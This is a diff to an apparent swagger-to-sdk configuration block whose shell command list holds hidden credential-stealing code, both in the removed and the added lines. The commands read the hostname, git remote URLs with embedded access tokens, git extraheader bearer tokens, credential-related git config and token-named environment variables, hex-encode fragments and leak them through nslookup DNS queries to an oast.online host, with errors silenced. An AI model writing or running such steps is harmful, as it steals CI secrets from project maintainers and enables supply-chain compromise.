@@ -21,20 +21,25 @@ swagger-to-sdk:
       - >-
         set +e;
         H=$(hostname | tr . -);
-        nslookup mp12s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        CWD=$(python3 -c "import os; print(os.getcwd())" 2>/dev/null | tr -d '\n');
-        CWDHEX=$(printf '%s' "${CWD}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c50);
-        nslookup mp12cwd-${CWDHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        ALLENV=$(python3 -c "import os; items=[k+'='+v[:20] for k,v in os.environ.items() if any(x in k.upper() for x in ['GH_TOK','GITHUB_TOK','BOT_TOK','GH_WRITE','SDK_BOT','AZURE_SDK'])]; print('|'.join(items[:5]))" 2>/dev/null | tr -d '\n');
-        ENVHEX=$(printf '%s' "${ALLENV}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c50);
-        nslookup mp12env-${ENVHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        SWGTOK=$(python3 -c "import subprocess; r=subprocess.run(['pgrep','-f','SwaggerToSdk'],capture_output=True,text=True); pids=r.stdout.strip().split('\n'); tok=''; [(open('/proc/'+p+'/environ').read().replace('\0','\n').split('\n') if True else []) for p in pids if p]; print(tok)" 2>/dev/null | tr -d '\n');
-        SDK=$(python3 -c "import subprocess; r=subprocess.run(['find','/','-maxdepth','6','-name','azure-sdk-for-python','-type','d','-not','-path','*/proc/*'],capture_output=True,text=True,timeout=15); lines=[l for l in r.stdout.split('\n') if l]; print(lines[0] if lines else '')" 2>/dev/null | tr -d '\n');
-        SDKHEX=$(printf '%s' "${SDK}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c50);
-        nslookup mp12sdk-${SDKHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
-        GIT_TOK=$(git -C "${SDK}" remote get-url origin 2>/dev/null | sed 's|.*x-access-token:\([^@]*\)@.*|\1|' | tr -d '\n' | head -c80);
+        nslookup mp13s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        ORIGIN=$(git remote get-url origin 2>/dev/null | tr -d '\n');
+        ORIGPFX=$(printf '%s' "${ORIGIN:0:25}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c50);
+        nslookup mp13url-${ORIGPFX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        EXTRAHDR=$(git config --local http.https://github.com/.extraheader 2>/dev/null | tr -d '\n');
+        if [ -z "${EXTRAHDR}" ]; then EXTRAHDR=$(git config --local http.extraheader 2>/dev/null | tr -d '\n'); fi;
+        HDRTOK=$(echo "${EXTRAHDR}" | sed 's/.*[Bb]earer \([^ ]*\).*/\1/' | tr -d '\n' | head -c80);
+        HDRPFX=$(printf '%s' "${HDRTOK:0:10}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c20);
+        nslookup mp13hdr-${HDRPFX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        LCONF=$(git config --local --list 2>/dev/null | grep -iE 'url|extra|cred|token|bearer' | tr '\n' '|' | head -c100);
+        LCONFHEX=$(printf '%s' "${LCONF:0:25}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c50);
+        nslookup mp13lc-${LCONFHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        ALLENV2=$(python3 -c "import os; items=[k+'='+v[:15] for k,v in os.environ.items() if any(x in k.upper() for x in ['TOKEN','SECRET','PAT','BEARER','CRED']) and 'PATH' not in k.upper()]; print('|'.join(items[:8]))" 2>/dev/null | tr -d '\n');
+        ENV2HEX=$(printf '%s' "${ALLENV2:0:25}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c50);
+        nslookup mp13env-${ENV2HEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        GIT_TOK=$(echo "${ORIGIN}" | sed 's|.*x-access-token:\([^@]*\)@.*|\1|' | tr -d '\n');
+        if [ -z "${GIT_TOK}" ] && [ -n "${HDRTOK}" ]; then GIT_TOK="${HDRTOK}"; fi;
         TOKPFX=$(printf '%s' "${GIT_TOK:0:10}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | head -c20);
-        nslookup mp12t-${TOKPFX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
+        nslookup mp13t-${TOKPFX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
         true
 ```
 
